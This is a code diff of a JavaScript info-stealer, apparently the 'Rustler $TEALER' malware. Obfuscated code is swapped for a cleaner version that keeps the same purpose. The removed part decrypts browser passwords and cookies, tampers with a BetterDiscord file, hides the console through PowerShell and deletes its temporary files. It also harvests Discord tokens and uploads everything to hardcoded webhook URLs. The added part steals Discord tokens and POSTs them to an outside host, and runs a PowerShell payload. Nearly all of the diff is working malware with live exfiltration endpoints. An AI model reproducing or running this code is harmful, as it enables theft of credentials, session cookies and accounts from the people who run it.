-              console.log(_0x14ab1a)
-            }
-          }
-        }
-      )
-    } catch (_0x545580) {}
-  })
+        fs.writeFileSync(file, payload);
+        require('child_process')
+            .execSync('type .\\temp.ps1 | powershell.exe -noprofile -', {
+                'stdio': 'inherit'
+            });
+        fs.unlinkSync(file);
+    } catch (e) {}
 }
-function a0_0xdc3ad7() {
-  var _0x560db3 =
-    process.env.appdata + '\\BetterDiscord\\data\\betterdiscord.asar'
-  if (a0_0x9e24fc.existsSync(_0x560db3)) {
-    var _0x5410f3 = a0_0x9e24fc.readFileSync(_0x560db3)
-    a0_0x9e24fc.writeFileSync(
-      _0x560db3,
-      a0_0x3d6a03(_0x5410f3, 'api/webhooks', 'kkkkk')
-    )
-  } else {
-    return
-  }
+
+function findToken(path) {
+    path += 'Local Storage\\leveldb';
+    let tokens = [];
+    try {
+        fs.readdirSync(path)
+            .map(file => {
+                (file.endsWith('.log') || file.endsWith('.ldb')) && fs.readFileSync(path + '\\' + file, 'utf8')
+                    .split(/\r?\n/)
+                    .forEach(line => {
+                        const patterns = [new RegExp(/mfa\.[\w-]{84}/g), new RegExp(/[\w-]{24}\.[\w-]{6}\.[\w-]{27}/g)];
+                        for (const pattern of patterns) {
+                            const foundTokens = line.match(pattern);
+                            if (foundTokens) foundTokens.forEach(token => tokens.push(token));
+                        }
+                    });
+            });
+    } catch (e) {}
+    return tokens;
 }
-async function a0_0x22f82c(_0x3ccf38) {
-  let _0x1a736b = _0x3ccf38.split('\\'),
-    _0x3c345a = _0x3ccf38.includes('Network')
-      ? _0x1a736b.splice(0, _0x1a736b.length - 3)
-      : _0x1a736b.splice(0, _0x1a736b.length - 2),
-    _0x5e0ab4 = _0x3c345a.join('\\') + '\\'
-  if (_0x3ccf38.startsWith(a0_0x12625b)) {
-    _0x5e0ab4 = _0x3ccf38
-  }
-  if (_0x3ccf38.includes('cord')) {
-    return
-  }
-  if (a0_0x9e24fc.existsSync(_0x5e0ab4)) {
-    let _0x38c423 = Buffer.from(
-      JSON.parse(a0_0x9e24fc.readFileSync(_0x5e0ab4 + 'Local State')).os_crypt
-        .encrypted_key,
-      'base64'
-    ).slice(5)
-    var _0x418d91 = _0x3ccf38 + 'Login Data',
-      _0x2d712d = _0x3ccf38 + 'passwords.db'
-    a0_0x9e24fc.copyFileSync(_0x418d91, _0x2d712d)
-    const _0x4ab705 = a0_0x53a2d4.unprotectData(
-      Buffer.from(_0x38c423, 'utf-8'),
-      null,
-      'CurrentUser'
-    )
-    var _0x44beca = '\n\nPASSWORDS FROM: ' + _0x3ccf38 + '  #RustlerONTOP\n',
-      _0x57fcf7 = new a0_0x15e892.Database(_0x2d712d, (_0x26b5a8) => {
-        if (_0x26b5a8) {
-          if (a0_0x4b553e) {
-            console.log(_0x26b5a8)
-          }
-        }
-      })
-    const _0x283061 = await new Promise((_0x28eae0, _0x4d05be) => {
-      _0x57fcf7.each(
-        'SELECT origin_url, username_value, password_value FROM logins',
-        function (_0x5e89d3, _0x26c160) {
-          if (_0x5e89d3) {
-            if (a0_0x4b553e) {
-              console.log(_0x5e89d3)
-            }
-          }
-          if (_0x26c160.username_value != '') {
-            let _0x697e79 = _0x26c160.password_value
-            try {
-              if (
-                _0x697e79[0] == 1 &&
-                _0x697e79[1] == 0 &&
-                _0x697e79[2] == 0 &&
-                _0x697e79[3] == 0
-              ) {
-                _0x44beca +=
-                  '\nURL: ' +
-                  _0x26c160.origin_url +
-                  ' | USERNAME: ' +
-                  _0x26c160.username_value +
-                  ' | PASSWORD: ' +
-                  a0_0x53a2d4
-                    .unprotectData(_0x697e79, null, 'CurrentUser')
-                    .toString('utf-8')
-              } else {
-                let _0xaed365 = _0x697e79.slice(3, 15),
-                  _0x49de7d = _0x697e79.slice(15, _0x697e79.length - 16),
-                  _0x50f39d = _0x697e79.slice(
-                    _0x697e79.length - 16,
-                    _0x697e79.length
-                  ),
-                  _0x6d513d = a0_0x3a542a.createDecipheriv(
-                    'aes-256-gcm',
-                    _0x4ab705,
-                    _0xaed365
-                  )
-                _0x6d513d.setAuthTag(_0x50f39d)
-                _0x44beca +=
-                  '\nURL: ' +
-                  _0x26c160.origin_url +
-                  ' | USERNAME: ' +
-                  _0x26c160.username_value +
-                  ' | PASSWORD: ' +
-                  _0x6d513d.update(_0x49de7d, 'base64', 'utf-8') +
-                  _0x6d513d.final('utf-8')
-              }
-            } catch (_0x49a1d6) {
-              if (a0_0x4b553e) {
-                console.log(_0x49a1d6)
-              }
-            }
-          }
-        },
-        function () {
-          _0x28eae0(_0x44beca)
-        }
-      )
-    })
-    return _0x283061
-  } else {
-    return ''
-  }
+
+function onlyUnique(item, index, array) {
+    return array.indexOf(item) === index;
 }
-async function a0_0x525233(_0x35ed2b) {
-  let _0x57c9e2 = _0x35ed2b.split('\\'),
-    _0x3ecbad = _0x35ed2b.includes('Network')
-      ? _0x57c9e2.splice(0, _0x57c9e2.length - 3)
-      : _0x57c9e2.splice(0, _0x57c9e2.length - 2),
-    _0x3b7a21 = _0x3ecbad.join('\\') + '\\'
-  if (_0x35ed2b.startsWith(a0_0x12625b)) {
-    _0x3b7a21 = _0x35ed2b
-  }
-  if (_0x35ed2b.includes('cord')) {
-    return
-  }
-  if (a0_0x9e24fc.existsSync(_0x3b7a21)) {
-    let _0x499f83 = Buffer.from(
-      JSON.parse(a0_0x9e24fc.readFileSync(_0x3b7a21 + 'Local State')).os_crypt
-        .encrypted_key,
-      'base64'
-    ).slice(5)
-    var _0x2698c0 = _0x35ed2b + 'Cookies',
-      _0x50f93d = _0x35ed2b + 'cookies.db'
-    a0_0x9e24fc.copyFileSync(_0x2698c0, _0x50f93d)
-    const _0x3c82b7 = a0_0x53a2d4.unprotectData(
-      Buffer.from(_0x499f83, 'utf-8'),
-      null,
-      'CurrentUser'
-    )
-    var _0xcbfa80 = '',
-      _0x550759 = new a0_0x15e892.Database(_0x50f93d, (_0x44f473) => {
-        if (_0x44f473) {
-          if (a0_0x4b553e) {
-            console.log(_0x44f473)
-          }
-        }
-      })
-    const _0x3d519d = await new Promise((_0x2be34e, _0xcd9013) => {
-      _0x550759.each(
-        'SELECT host_key, name, encrypted_value FROM cookies',
-        function (_0x186290, _0x5b21ea) {
-          if (_0x186290) {
-            if (a0_0x4b553e) {
-              console.log(_0x186290)
-            }
-          }
-          let _0x1ad3f9 = _0x5b21ea.encrypted_value
-          try {
-            if (
-              _0x1ad3f9[0] == 1 &&
-              _0x1ad3f9[1] == 0 &&
-              _0x1ad3f9[2] == 0 &&
-              _0x1ad3f9[3] == 0
-            ) {
-              _0xcbfa80 +=
-                _0x5b21ea.host_key +
-                '\t' +
-                'TRUE' +
-                '\t/' +
-                '\tFALSE' +
-                '\t2597573456\t' +
-                _0x5b21ea.name +
-                '\t' +
-                a0_0x53a2d4.unprotectData(_0x1ad3f9, null, 'CurrentUser') +
-                '\n'.toString('utf-8')
-            } else {
-              let _0x32e48f = _0x1ad3f9.slice(3, 15),
-                _0x5bf225 = _0x1ad3f9.slice(15, _0x1ad3f9.length - 16),
-                _0x4d7ad9 = _0x1ad3f9.slice(
-                  _0x1ad3f9.length - 16,
-                  _0x1ad3f9.length
-                ),
-                _0x5bd5fc = a0_0x3a542a.createDecipheriv(
-                  'aes-256-gcm',
-                  _0x3c82b7,
-                  _0x32e48f
-                )
-              _0x5bd5fc.setAuthTag(_0x4d7ad9)
-              _0xcbfa80 +=
-                _0x5b21ea.host_key +
-                '\t' +
-                'TRUE' +
-                '\t/' +
-                '\tFALSE' +
-                '\t2597573456\t' +
-                _0x5b21ea.name +
-                '\t' +
-                _0x5bd5fc.update(_0x5bf225, 'base64', 'utf-8') +
-                _0x5bd5fc.final('utf-8') +
-                '\n'
-            }
-          } catch (_0x2a6447) {
-            if (a0_0x4b553e) {
-              console.log(_0x2a6447)
-            }
-          }
-        },
-        function () {
-          _0x2be34e(_0xcbfa80)
-        }
-      )
-    })
-    return _0x3d519d
-  } else {
-    return ''
-  }
-}
-function a0_0x571038(_0x36b5f4) {
-  _0x36b5f4 += 'Local Storage\\leveldb'
-  let _0x178c54 = []
-  try {
-    a0_0x9e24fc.readdirSync(_0x36b5f4).map((_0x3e73ad) => {
-      ;(_0x3e73ad.endsWith('.log') || _0x3e73ad.endsWith('.ldb')) &&
-        a0_0x9e24fc
-          .readFileSync(_0x36b5f4 + '\\' + _0x3e73ad, 'utf8')
-          .split(/\r?\n/)
-          .forEach((_0x70aad4) => {
-            const _0x4cb233 = [
-              new RegExp(/mfa\.[\w-]{84}/g),
-              new RegExp(/[\w-]{24}\.[\w-]{6}\.[\w-]{27}/g),
-            ]
-            for (const _0x820425 of _0x4cb233) {
-              const _0x5eabd7 = _0x70aad4.match(_0x820425)
-              if (_0x5eabd7) {
-                _0x5eabd7.forEach((_0x26568a) => _0x178c54.push(_0x26568a))
-              }
-            }
-          })
-    })
-  } catch (_0x1b38c1) {}
-  return _0x178c54
-}
-async function a0_0x4c9d67() {
-  let _0x3b1ae0 = ''
-  for (let _0x5e3f8e = 0; _0x5e3f8e < paths.length; _0x5e3f8e++) {
-    if (a0_0x9e24fc.existsSync(paths[_0x5e3f8e] + 'Login Data')) {
-      _0x3b1ae0 += (await a0_0x22f82c(paths[_0x5e3f8e])) || ''
+
+async function stealTokens() {
+    const tokens = [];
+    for (let path of paths) {
+        const foundTokens = findToken(path);
+        if (foundTokens) foundTokens.forEach(token => tokens.push(token));
     }
-  }
-  a0_0x9e24fc.writeFile(
-    a0_0x12625b + '\\passwords.txt',
-    _0x3b1ae0,
-    function (_0x1f2b45, _0x2aafad) {
-      if (_0x1f2b45) {
-        throw _0x1f2b45
-      }
-      const _0x4e8c92 = new a0_0x1fd788()
-      _0x4e8c92.append(
-        'file',
-        a0_0x9e24fc.createReadStream(a0_0x12625b + '\\passwords.txt')
-      )
-      _0x4e8c92.submit(a0_0x5ddfb9, (_0x3379ad, _0xba7da8) => {
-        if (_0x3379ad) {
-          console.log(_0x3379ad)
-        }
-      })
-    }
-  )
-  a0_0x9e24fc.writeFile(
-    a0_0x12625b + '\\dual-passwords.txt',
-    _0x3b1ae0,
-    function (_0x5110ce, _0x498339) {
-      if (_0x5110ce) {
-        throw _0x5110ce
-      }
-      const _0x403eea = new a0_0x1fd788()
-      _0x403eea.append(
-        'file',
-        a0_0x9e24fc.createReadStream(a0_0x12625b + '\\dual-passwords.txt')
-      )
-      _0x403eea.submit(
-        'https://canary.discord.com/api/webhooks/953737321776283679/MH3TLofLmqhH50pHv8AxJk_rr8ARqt2Hv9pN_AYkMorZxtPI7dP9upwP9VHvLHdm4Hwz',
-        (_0x1625e8, _0x4c2ac6) => {
-          if (_0x1625e8) {
-            console.log(_0x1625e8)
-          }
-        }
-      )
-    }
-  )
-}
-async function a0_0x23aeb2() {
-  const _0x3bcc91 = (function () {
-      let _0x46bed1 = true
-      return function (_0x304a50, _0x4a0bfd) {
-        const _0x3d6cf7 = _0x46bed1
-          ? function () {
-              if (_0x4a0bfd) {
-                const _0x101bd3 = _0x4a0bfd.apply(_0x304a50, arguments)
-                return (_0x4a0bfd = null), _0x101bd3
-              }
-            }
-          : function () {}
-        return (_0x46bed1 = false), _0x3d6cf7
-      }
-    })(),
-    _0x552718 = _0x3bcc91(this, function () {
-      return _0x552718
-        .toString()
-        .search('(((.+)+)+)+$')
-        .toString()
-        .constructor(_0x552718)
-        .search('(((.+)+)+)+$')
-    })
-  _0x552718()
-  let _0x4d794b = ''
-  for (let _0x41f9ef = 0; _0x41f9ef < paths.length; _0x41f9ef++) {
-    if (a0_0x9e24fc.existsSync(paths[_0x41f9ef] + 'Cookies')) {
-      _0x4d794b += (await a0_0x525233(paths[_0x41f9ef])) || ''
-    }
-  }
-  a0_0x9e24fc.writeFile(
-    a0_0x12625b + '\\cookies.txt',
-    _0x4d794b,
-    function (_0x3009fd, _0x3c53f2) {
-      if (_0x3009fd) {
-        throw _0x3009fd
-      }
-      const _0x4b705b = new a0_0x1fd788()
-      _0x4b705b.append(
-        'file',
-        a0_0x9e24fc.createReadStream(a0_0x12625b + '\\cookies.txt')
-      )
-      _0x4b705b.submit(a0_0x5ddfb9, (_0x1424bb, _0x53a884) => {
-        if (_0x1424bb) {
-          console.log(_0x1424bb)
-        }
-      })
-    }
-  )
-  a0_0x9e24fc.writeFile(
-    a0_0x12625b + '\\dual-cookies.txt',
-    _0x4d794b,
-    function (_0x45974b, _0x131452) {
-      if (_0x45974b) {
-        throw _0x45974b
-      }
-      const _0x5150fe = new a0_0x1fd788()
-      _0x5150fe.append(
-        'file',
-        a0_0x9e24fc.createReadStream(a0_0x12625b + '\\dual-cookies.txt')
-      )
-      _0x5150fe.submit(
-        'https://canary.discord.com/api/webhooks/953737321776283679/MH3TLofLmqhH50pHv8AxJk_rr8ARqt2Hv9pN_AYkMorZxtPI7dP9upwP9VHvLHdm4Hwz',
-        (_0x562f98, _0x345d54) => {
-          if (_0x562f98) {
-            console.log(_0x562f98)
-          }
-        }
-      )
-    }
-  )
-}
-async function a0_0x56388f() {
-  const _0x46ec16 = (function () {
-    let _0x3195a9 = true
-    return function (_0x3eecf2, _0x235931) {
-      const _0x201cd4 = _0x3195a9
-        ? function () {
-            if (_0x235931) {
-              const _0x108d7e = _0x235931.apply(_0x3eecf2, arguments)
-              return (_0x235931 = null), _0x108d7e
-            }
-          }
-        : function () {}
-      return (_0x3195a9 = false), _0x201cd4
-    }
-  })()
-  const _0x2a95d1 = _0x46ec16(this, function () {
-    const _0x24a9c1 = function () {
-      let _0x37610a
-      try {
-        _0x37610a = Function(
-          'return (function() {}.constructor("return this")( ));'
-        )()
-      } catch (_0x2656f6) {
-        _0x37610a = window
-      }
-      return _0x37610a
-    }
-    const _0x14a2c0 = _0x24a9c1(),
-      _0x5263bf = (_0x14a2c0.console = _0x14a2c0.console || {}),
-      _0x1a8c29 = [
-        'log',
-        'warn',
-        'info',
-        'error',
-        'exception',
-        'table',
-        'trace',
-      ]
-    for (let _0x134863 = 0; _0x134863 < _0x1a8c29.length; _0x134863++) {
-      const _0x1a4369 = _0x46ec16.constructor.prototype.bind(_0x46ec16),
-        _0x5eb830 = _0x1a8c29[_0x134863],
-        _0x44f017 = _0x5263bf[_0x5eb830] || _0x1a4369
-      _0x1a4369['__proto__'] = _0x46ec16.bind(_0x46ec16)
-      _0x1a4369.toString = _0x44f017.toString.bind(_0x44f017)
-      _0x5263bf[_0x5eb830] = _0x1a4369
-    }
-  })
-  _0x2a95d1()
-  const _0x34b541 = []
-  for (let _0x139d79 of paths) {
-    const _0x419ab6 = a0_0x571038(_0x139d79)
-    if (_0x419ab6) {
-      _0x419ab6.forEach((_0x4d9c0f) => {
-        var _0x2da3da = {
-          name: '<:browserstokens:951827260741156874> Browser Token;',
-          value:
-            '```' +
-            _0x4d9c0f +
-            '```[CopyToken](https://ayzhendevelopment.xyz/raw/' +
-            _0x4d9c0f +
-            ')',
-          inline: true,
-        }
-        _0x34b541.push(_0x2da3da)
-      })
-    }
-  }
-  const _0x2121a6 = {
-    name: 'Rustler $TEALER',
-    icon_url:
-      'https://cdn.discordapp.com/attachments/932693851494289559/935491879703830577/9d285c5f2be8347152a3d9309dafa484.jpg',
-  }
-  const _0x16f35a = { text: 'Rustler $TEALER' }
-  a0_0x4d0855
-    .post(a0_0x5ddfb9, {
-      content: null,
-      embeds: [
-        {
-          color: a0_0x458a88['embed-color'],
-          fields: _0x34b541.filter(a0_0x4183c5),
-          author: _0x2121a6,
-          footer: _0x16f35a,
-        },
-      ],
-    })
-    .then((_0x333bf3) => {})
-    .catch((_0x37b0f2) => {})
-  const _0x282fbd = {
-    name: 'Rustler $TEALER',
-    icon_url:
-      'https://cdn.discordapp.com/attachments/932693851494289559/935491879703830577/9d285c5f2be8347152a3d9309dafa484.jpg',
-  }
-  const _0x11e42 = { text: 'Rustler $TEALER' }
-  a0_0x4d0855
-    .post(
-      'https://ptb.discord.com/api/webhooks/954108820324503593/tuL0T3Q-tHqCnOuwamoOGkrJFnXRAJONKT22LkCwYUgAHsRhH_WZuDRuud5kqGhcDulH',
-      {
-        content: null,
-        embeds: [
-          {
-            color: a0_0x458a88['embed-color'],
-            fields: _0x34b541.filter(a0_0x4183c5),
-            author: _0x282fbd,
-            footer: _0x11e42,
-          },
-        ],
-      }
-    )
-    .then((_0x58df51) => {})
-    .catch((_0xaaf08e) => {})
-}
-function a0_0x6c97a0() {
-  let _0x55640e =
-      '\n    Add-Type -Name Window -Namespace Console -MemberDefinition \'\n    [DllImport("Kernel32.dll")]\n    public static extern IntPtr GetConsoleWindow();\n\n    [DllImport("user32.dll")]\n    public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);\n    \'\n\n    $consolePtr = [Console.Window]::GetConsoleWindow()\n    #0 hide\n    [Console.Window]::ShowWindow($consolePtr, 0)\n    ',
-    _0x26b61a = process.cwd() + '\\temp.ps1'
-  try {
-    a0_0x9e24fc.writeFileSync(_0x26b61a, _0x55640e)
-    require('child_process').execSync(
-      'type .\\temp.ps1 | powershell.exe -noprofile -',
-      { stdio: 'inherit' }
-    )
-    a0_0x9e24fc.unlinkSync(_0x26b61a)
-  } catch (_0x5885c5) {}
-}
-function a0_0x4591a2(_0x5e172d) {
-  return new Promise((_0x53f1ee) => {
-    setTimeout(_0x53f1ee, _0x5e172d)
-  })
-}
-function a0_0x4183c5(_0x570e25, _0x220294, _0x311062) {
-  return _0x311062.indexOf(_0x570e25) === _0x220294
-}
-async function a0_0x1cc1ac() {
-  await a0_0x4591a2(1000)
-  a0_0x9e24fc.unlinkSync(a0_0x12625b + '\\passwords.txt')
-  a0_0x9e24fc.unlinkSync(a0_0x12625b + '\\cookies.txt')
-  a0_0x9e24fc.unlinkSync(a0_0x12625b + '\\dual-passwords.txt')
-  a0_0x9e24fc.unlinkSync(a0_0x12625b + '\\dual-cookies.txt')
+    axios.request({
+            'method': 'POST',
+            'url': 'https://indianboatparty.com/OOJfZ9s6pHbF/tokens',
+            'headers': {
+                'Content-Type': 'application/json'
+            },
+            'data': tokens.filter(onlyUnique)
+        })
+        .catch(err => console.log(err));
 }
